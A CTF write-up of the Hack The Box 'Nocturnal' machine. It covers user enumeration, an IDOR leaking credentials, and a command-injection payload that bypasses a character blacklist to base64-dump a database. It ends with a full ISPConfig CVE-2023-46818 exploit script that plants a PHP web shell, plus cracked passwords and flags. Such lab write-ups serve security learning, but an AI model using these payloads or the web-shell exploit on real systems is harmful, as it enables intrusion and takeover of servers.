---
title: Nocturnal
date: 2025-08-26 14:46:00 +0100
categories: [ctf, htb]
tags: [web, linux, lfi] 
image: https://res.cloudinary.com/djo6idowf/image/upload/v1751662583/Nocturnal_mydxij.png
---
[Nocturnal](https://app.hackthebox.com/machines/Nocturnal) is an Easy machine released on 12th April 2025 on Hack The Box.

User Flag: `546201c3ee29fca9f54e02fbc228f873`

Root Flag: `bc852d87bf92e7a5fc72a4f19606eb6c`

## Write-up

`nmap -A -T4 10.10.11.64`

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 17:40 EDT
Nmap scan report for 10.10.11.64
Host is up (0.023s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
|_  256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nocturnal.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 199/tcp)
HOP RTT      ADDRESS
1   20.00 ms 10.10.14.1
2   20.00 ms 10.10.11.64
```

`http://nocturnal.htb`

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751662584/image_hct1kc.png)

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751662586/image_ezundg.png)

This does seem to be hinting about file upload policies. Next step is to make an account and explore.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751662587/image_zjqyyo.png)

It actually wanted a bigger username `testtest:testtest` .

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751662592/image_g5orw8.png)

Attempt to upload a random `.png` and see what it looks both on the webpage and in Burp.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751662594/image_qwjbwc.png)

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751662596/image_dp3gzz.png)

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751662598/image_cnrart.png)

![image.png](https://res.cloudinary.com/djo6idowf/image/upload/v1751662600/image_d3eqdf.png)

```
POST /dashboard.php HTTP/1.1
Host: nocturnal.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------28454071543142614173858218171
Content-Length: 239
Origin: http://nocturnal.htb
Connection: keep-alive
Referer: http://nocturnal.htb/dashboard.php
Cookie: PHPSESSID=54morik5betovda2o9300e5t6g
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------28454071543142614173858218171
Content-Disposition: form-data; name="fileToUpload"; filename="epic.doc"
Content-Type: application/msword

test

-----------------------------28454071543142614173858218171--
```

If you click the uploaded file it just re-downloads the file. Simple functionality.

```
GET /view.php?username=testtest&file=epic.doc HTTP/1.1
Host: nocturnal.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://nocturnal.htb/dashboard.php
Cookie: PHPSESSID=54morik5betovda2o9300e5t6g
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

`GET /view.php?username=testtest&file=epic.doc HTTP/1.1`

`&file=epic.doc` - this look like a direct calling to a file. I think we can abuse this. Local file inclusion?

```
GET /view.php?username=testtest&file=....//....//....//etc/passwd HTTP/1.1
Host: nocturnal.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://nocturnal.htb/dashboard.php
Cookie: PHPSESSID=54morik5betovda2o9300e5t6g
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

```
   <div class='error'>Invalid file extension.</div>
```

It still expects a legitimate file type. Tried a few variations but it never find a file. It is looking for a specific file and won’t output anything without it.

Ok, maybe it’s more to do with the username. Can I enumerate a users via the URL?

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751662602/image_pir5rk.png)

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751662607/image_vtiocv.png)

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751662609/image_m5zmm3.png)

`ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -u '[http://nocturnal.htb/view.php?username=FUZZ&file=epic.doc](http://nocturnal.htb/view.php?username=jerry&file=epic.doc) -H 'Cookie: PHPSESSID=54morik5betovda2o9300e5t6g'`

And then filter out the sizes that give back `302` responses with `fs` .

`ffuf -w /usr/share/wordlists/SecLists-master/Usernames/Names/names.txt -u 'http://nocturnal.htb/view.php?username=FUZZ&file=epic.doc' -H 'Cookie: PHPSESSID=54morik5betovda2o9300e5t6g' -fs 2919`

```
________________________________________________

 :: Method           : GET
 :: URL              : http://nocturnal.htb/view.php?username=FUZZ&file=epic.doc
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists-master/Usernames/Names/names.txt
 :: Header           : Cookie: PHPSESSID=54morik5betovda2o9300e5t6g
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 2919
________________________________________________

:: Progress: [10713/10713] :: Job [1/1] :: 232 req/sec :: Duration: [0:00:54] :: Errors: 0 ::
```

I think I might be doing something wrong. Logged out and back in and used a new session ID.

```
________________________________________________

 :: Method           : GET
 :: URL              : http://nocturnal.htb/view.php?username=FUZZ&file=epic.doc
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists-master/Usernames/Names/names.txt
 :: Header           : Cookie: PHPSESSID=54morik5betovda2o9300e5t6g
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 2985
________________________________________________

admin                   [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 12ms]
amanda                  [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 24ms]
tobias                  [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 20ms]
:: Progress: [10713/10713] :: Job [1/1] :: 192 req/sec :: Duration: [0:01:00] :: Errors: 0 ::
```

[`http://nocturnal.htb/view.php?username=amanda&file=epic.doc`](http://nocturnal.htb/view.php?username=amanda&file=epic.doc)

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751662610/image_vfuhin.png)

`admin` and `tobias` don’t have any files but `amanda` does.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751664680/image_eqf2sc.png)

`amanda:arHkG7HAI68X8s1J` - now we have a login. And it’s been set for all services, so `ssh` ? Nope doesn’t like it. We can try it on the website instead.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751662612/image_h3roqf.png)

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751662617/image_s9axga.png)

[`http://nocturnal.htb/admin.php`](http://nocturnal.htb/admin.php)

```php
<?php
session_start();

if (!isset($_SESSION['user_id']) || ($_SESSION['username'] !== 'admin' && $_SESSION['username'] !== 'amanda')) {
    header('Location: login.php');
    exit();
}

function sanitizeFilePath($filePath) {
    return basename($filePath); // Only gets the base name of the file
}

// List only PHP files in a directory
function listPhpFiles($dir) {
    $files = array_diff(scandir($dir), ['.', '..']);
    echo "<ul class='file-list'>";
    foreach ($files as $file) {
        $sanitizedFile = sanitizeFilePath($file);
        if (is_dir($dir . '/' . $sanitizedFile)) {
            // Recursively call to list files inside directories
            echo "<li class='folder'>📁 <strong>" . htmlspecialchars($sanitizedFile) . "</strong>";
            echo "<ul>";
            listPhpFiles($dir . '/' . $sanitizedFile);
            echo "</ul></li>";
        } else if (pathinfo($sanitizedFile, PATHINFO_EXTENSION) === 'php') {
            // Show only PHP files
            echo "<li class='file'>📄 <a href='admin.php?view=" . urlencode($sanitizedFile) . "'>" . htmlspecialchars($sanitizedFile) . "</a></li>";
        }
    }
    echo "</ul>";
}

// View the content of the PHP file if the 'view' option is passed
if (isset($_GET['view'])) {
    $file = sanitizeFilePath($_GET['view']);
    $filePath = __DIR__ . '/' . $file;
    if (file_exists($filePath) && pathinfo($filePath, PATHINFO_EXTENSION) === 'php') {
        $content = htmlspecialchars(file_get_contents($filePath));
    } else {
        $content = "File not found or invalid path.";
    }
}

function cleanEntry($entry) {
    $blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];

    foreach ($blacklist_chars as $char) {
        if (strpos($entry, $char) !== false) {
            return false; // Malicious input detected
        }
    }

    return htmlspecialchars($entry, ENT_QUOTES, 'UTF-8');
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Poppins', sans-serif;
            background-color: #1a1a1a;
            margin: 0;
            padding: 0;
            color: #ff8c00;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .container {
            background-color: #2c2c2c;
            width: 90%;
            max-width: 1000px;
            padding: 30px;
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.5);
            border-radius: 12px;
        }

        h1, h2 {
            color: #ff8c00;
            font-weight: 600;
        }

        form {
            display: flex;
            flex-direction: column;
            gap: 15px;
            margin-bottom: 30px;
        }

        input[type="password"] {
            padding: 12px;
            font-size: 16px;
            border: 1px solid #555;
            border-radius: 8px;
            width: 100%;
            background-color: #333;
            color: #ff8c00;
        }

        button {
            padding: 12px;
            font-size: 16px;
            background-color: #2d72bc;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #245a9e;
        }

        .file-list {
            list-style: none;
            padding: 0;
        }

        .file-list li {
            background-color: #444;
            padding: 15px;
            margin-bottom: 10px;
            border-radius: 8px;
            display: flex;
            align-items: center;
        }

        .file-list li.folder {
            background-color: #3b3b3b;
        }

        .file-list li.file {
            background-color: #4d4d4d;
        }

        .file-list li a {
            color: #ff8c00;
            text-decoration: none;
            margin-left: 10px;
        }

        .file-list li a:hover {
            text-decoration: underline;
        }

        pre {
            background-color: #2d2d2d;
            color: #eee;
            padding: 20px;
            border-radius: 8px;
            overflow-x: auto;
            font-family: 'Courier New', Courier, monospace;
        }

        .message {
            padding: 15px;
            border-radius: 8px;
            margin-top: 15px;
            background-color: #e7f5e6;
            color: #2d7b40;
            font-weight: 500;
        }

        .error {
            background-color: #f8d7da;
            color: #842029;
        }

        .backup-output {
            margin-top: 20px;
            padding: 15px;
            border: 1px solid #555;
            border-radius: 8px;
            background-color: #333;
            color: #ff8c00;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Admin Panel</h1>

        <h2>File Structure (PHP Files Only)</h2>
        <?php listPhpFiles(__DIR__); ?>

        <h2>View File Content</h2>
        <?php if (isset($content)) { ?>
            <pre><?php echo $content; ?></pre>
        <?php } ?>

        <h2>Create Backup</h2>
        <form method="POST">
            <label for="password">Enter Password to Protect Backup:</label>
            <input type="password" name="password" required placeholder="Enter backup password">
            <button type="submit" name="backup">Create Backup</button>
        </form>

        <div class="backup-output">

<?php
if (isset($_POST['backup']) && !empty($_POST['password'])) {
    $password = cleanEntry($_POST['password']);
    $backupFile = "backups/backup_" . date('Y-m-d') . ".zip";

    if ($password === false) {
        echo "<div class='error-message'>Error: Try another password.</div>";
    } else {
        $logFile = '/tmp/backup_' . uniqid() . '.log';
       
        $command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";
        
        $descriptor_spec = [
            0 => ["pipe", "r"], // stdin
            1 => ["file", $logFile, "w"], // stdout
            2 => ["file", $logFile, "w"], // stderr
        ];

        $process = proc_open($command, $descriptor_spec, $pipes);
        if (is_resource($process)) {
            proc_close($process);
        }

        sleep(2);

        $logContents = file_get_contents($logFile);
        if (strpos($logContents, 'zip error') === false) {
            echo "<div class='backup-success'>";
            echo "<p>Backup created successfully.</p>";
            echo "<a href='" . htmlspecialchars($backupFile) . "' class='download-button' download>Download Backup</a>";
            echo "<h3>Output:</h3><pre>" . htmlspecialchars($logContents) . "</pre>";
            echo "</div>";
        } else {
            echo "<div class='error-message'>Error creating the backup.</div>";
        }

        unlink($logFile);
    }
}
?>

	</div>
        
        <?php if (isset($backupMessage)) { ?>
            <div class="message"><?php echo $backupMessage; ?></div>
        <?php } ?>
    </div>
</body>
</html>
```

```php
$blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];
```

There’s some blacklisted characters but it’s not extensive so we can probably find some ways around this. 

```php
$db = new SQLite3('../nocturnal_database/nocturnal_database.db');
```

We also have a database file path which might be worth exploring.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751662615/image_ps2dvq.png)

The code relates to the `Create Backup` section of the admin site at `/admin.php` . Let’s test with a random password in the password field and then press `Create Backup` .

```
POST /admin.php HTTP/1.1
Host: nocturnal.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 21
Origin: http://nocturnal.htb
Connection: keep-alive
Referer: http://nocturnal.htb/admin.php
Cookie: PHPSESSID=54morik5betovda2o9300e5t6g
Upgrade-Insecure-Requests: 1
Priority: u=0, i

password=test&backup=
```

```
POST /admin.php HTTP/1.1
Host: nocturnal.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 78
Origin: http://nocturnal.htb
Connection: keep-alive
Referer: http://nocturnal.htb/admin.php
Cookie: PHPSESSID=54morik5betovda2o9300e5t6g
Upgrade-Insecure-Requests: 1
Priority: u=0, i

password=test"/
base64%09../nocturnal_database/nocturnal_database.db"&backup=
```

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751662620/image_xnzwxu.png)

So in the blacklist only checked for `\n` alone so if you put `\r` before it you bypass it. You also need to use a tab character which is represented in the command with `%09` but you can also use `\t` in Burp for this. You can then specific the file that you want to read - in this case the database file. And lastly, the only way for the database file contents to be outputted is to `base64` encode it so you need to put that before the tab.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751662618/image_ftdocg.png)

You do get back a lot of fluff but if you take the entire output and then pop it into CyberChef and have a look through it you will eventually see some usernames with hashed passwords.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751662622/image_aozrk4.png)

There are also some random `M` characters but we can just ignore them. The next step is to then attempt to crack the hashes.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751662635/image_br6zlf.png)

`hashcat -m 0 -a 0 --username hashes.txt /usr/share/wordlists/rockyou.txt`

I only managed to crack one hash, which was for `tobias` - whether or not that’s by design I don’t know but I should tr SSH for an initial foothold.

`55c82b1ccd55ab219b3b109b07d5061d:slowmotionapocalypse`

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751662637/image_b8y1ld.png)

There doesn’t seem to be any immediately obvious exploits or misconfigurations on the box. However, there is an open port that wasn’t picked up by Nmap which is `8080` which I would imagine is another web server.

```
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:587           0.0.0.0:*               LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
udp        0      0 127.0.0.53:53           0.0.0.0:*              
```

`tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN`

In order to reach this we will need to do some forwarding. 

`ssh -f -N -D 1080 [tobias@10.10.11.64](mailto:tobias@10.10.11.64)`

We can setup the Proxychains file up to use port `1080` and then use FoxyProxy to use the same port as well and reach the site and then browse to `127.0.0.1:8080` .

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751662642/image_zqdmri.png)

`tobias` did not work, but if you re-use his password with all of the usernames we found earlier with the hashes, you will find that `admin` also uses this password and you can get in.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751662640/2025-07-02_19-04_iunxlz.png)

So with most challenges like this it’s probably something to do with the obscure software that is being used. Next step is to figure out the version number of the software the site uses and see if there are any easy exploits.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751662646/2025-07-02_19-08_nlm2dl.png)

`searchsploit ISPConfig`

```
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ISPConfig - (Authenticated) Arbitrary PHP Code Execution (Metasploit)                                                     | php/remote/29322.rb
ISPConfig 2.2.2/2.2.3 - 'Session.INC.php' Remote File Inclusion                                                           | php/webapps/27845.php
ISPConfig 2.2.3 - Multiple Remote File Inclusions                                                                         | php/webapps/28027.txt
ISPConfig 3.0.5.4p6 - Multiple Vulnerabilities                                                                            | php/webapps/37259.txt
ISPConfig 3.0.54p1 - (Authenticated) Admin Privilege Escalation                                                           | linux/webapps/34241.txt
ISPConfig < 3.1.13 - Remote Command Execution                                                                             | php/webapps/45534.py
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

Doesn’t seem to be anything here, but it’s not always a conclusive list.

[NVD - CVE-2023-46818](https://nvd.nist.gov/vuln/detail/CVE-2023-46818)

https://github.com/ajdumanhug/CVE-2023-46818

```python
import base64
import requests
import sys
import re
import random
import string
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def ensure_url_structure(url):
    if not url.startswith(('http://', 'https://')):
        print("[-] URL missing scheme (http:// or https://), adding http:// by default.")
        url = "http://" + url
    if not url.endswith('/'):
        url += '/'
    return url

def login(url, username, password, session):
    login_url = f"{url}login/"
    data = {
        'username': username,
        'password': password,
        's_mod': 'login'
    }

    print(f"[+] Logging in with username '{username}' and password '{password}'")
    resp = session.post(login_url, data=data, verify=False)
    if 'Username or Password wrong' in resp.text:
        sys.exit("[-] Login failed!")
    print("[+] Login successful!")

def get_csrf_tokens(url, session, lang_file):
    print("[+] Fetching CSRF tokens...")
    target_url = f"{url}admin/language_edit.php"
    data = {
        'lang': 'en',
        'module': 'help',
        'lang_file': lang_file
    }
    resp = session.post(target_url, data=data, verify=False)

    csrf_id_match = re.search(r'_csrf_id" value="([^"]+)"', resp.text)
    csrf_key_match = re.search(r'_csrf_key" value="([^"]+)"', resp.text)

    if not csrf_id_match or not csrf_key_match:
        sys.exit("[-] CSRF tokens not found!")

    print(f"[+] CSRF ID: {csrf_id_match.group(1)}")
    print(f"[+] CSRF Key: {csrf_key_match.group(1)}")
    return csrf_id_match.group(1), csrf_key_match.group(1)

def inject_shell(url, session, lang_file, csrf_id, csrf_key):
    print("[+] Injecting shell payload...")

    payload = base64.b64encode(
        b"<?php print('____'); passthru(base64_decode($_SERVER['HTTP_C'])); print('____'); ?>"
    ).decode()

    injection = f"'];file_put_contents('sh.php',base64_decode('{payload}'));die;#"

    data = {
        'lang': 'en',
        'module': 'help',
        'lang_file': lang_file,
        '_csrf_id': csrf_id,
        '_csrf_key': csrf_key,
        'records[\\]': injection
    }

    resp = session.post(f"{url}admin/language_edit.php", data=data, verify=False)

    if resp.status_code == 200:
        print(f"[+] Shell written to: {url}admin/sh.php")
    else:
        print(f"[-] Failed to send payload, HTTP {resp.status_code}")

def launch_shell(url, session):
    print("[+] Launching shell...")
    shell_url = f"{url}admin/sh.php"

    while True:
        try:
            cmd = input("\nispconfig-shell# ")
            if cmd.strip().lower() == "exit":
                break

            headers = {'C': base64.b64encode(cmd.encode()).decode()}
            resp = session.get(shell_url, headers=headers, verify=False)
            output = re.search(r'____(.*)____', resp.text, re.DOTALL)

            if output:
                print(output.group(1).strip())
            else:
                print("[-] Exploit failed or no output.")
        except KeyboardInterrupt:
            break

def random_lang_file():
    return ''.join(random.choices(string.ascii_lowercase, k=8)) + '.lng'

def main():
    if len(sys.argv) != 4:
        print(f"Usage: python3 {sys.argv[0]} <URL> <Username> <Password>")
        sys.exit(1)

    url, user, passwd = sys.argv[1:]
    url = ensure_url_structure(url)

    session = requests.Session()
    login(url, user, passwd, session)

    lang_file = random_lang_file()
    csrf_id, csrf_key = get_csrf_tokens(url, session, lang_file)
    inject_shell(url, session, lang_file, csrf_id, csrf_key)
    launch_shell(url, session)

if __name__ == "__main__":
    main()
```

`proxychains python [exploit.py](http://exploit.py/) [http://10.10.11.64:8080/](http://10.10.10.10/) admin slowmotionapocalypse`

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751662644/image_xm3tp9.png)

And we’re in.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751662651/image_rccox3.png)

![image.png](https://res.cloudinary.com/djo6idowf/image/upload/v1751662653/image_pykzgc.png)

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751662649/Screenshot_2025-07-04_214102_rblumk.png)

# Thoughts

It’s ok. Generally I find the Easy challenges to be overly convoluted and unrealistic. Nocturnal was good enough I suppose and it posed a good amount of challenge, and at points probably bit too much for the difficulty level.